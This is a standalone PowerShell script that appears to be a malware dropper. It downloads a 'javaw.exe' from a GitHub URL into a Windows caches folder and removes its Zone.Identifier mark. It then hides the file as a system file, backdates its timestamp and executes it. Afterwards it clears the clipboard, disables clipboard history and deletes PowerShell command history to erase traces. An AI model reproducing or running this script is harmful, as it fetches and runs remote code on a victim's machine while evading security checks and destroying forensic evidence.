$s = "$env:LOCALAPPDATA\Microsoft\Windows\Caches\javaw.exe"
Get-Process javaw -EA 0 | Where-Object { $_.Path -like "*Caches*" } | Stop-Process -Force
Start-Sleep -Milliseconds 300
attrib -r -h -s $s 2>$null
Remove-Item $s -Force -EA 0
New-Item -ItemType Directory -Force -Path (Split-Path $s) | Out-Null
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
(New-Object Net.WebClient).DownloadFile(
    'https://github.com/unrefidings/weicoclient/raw/main/javaw.exe', $s)
Remove-Item "${s}:Zone.Identifier" -Force -EA 0
try { Unblock-File $s -EA 0 } catch {}
$i = Get-Item $s -Force
$i.Attributes = 'Hidden,System'
$i.LastWriteTime = [datetime]"2026-11-08 23:59"
Start-Process $s
try { Clear-Clipboard -EA 0 } catch {}
reg add "HKCU\Software\Microsoft\Clipboard" /v EnableClipboardHistory `
    /t REG_DWORD /d 0 /f | Out-Null
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard\*" `
    -Recurse -Force -EA 0
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" `
    -Force -EA 0
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
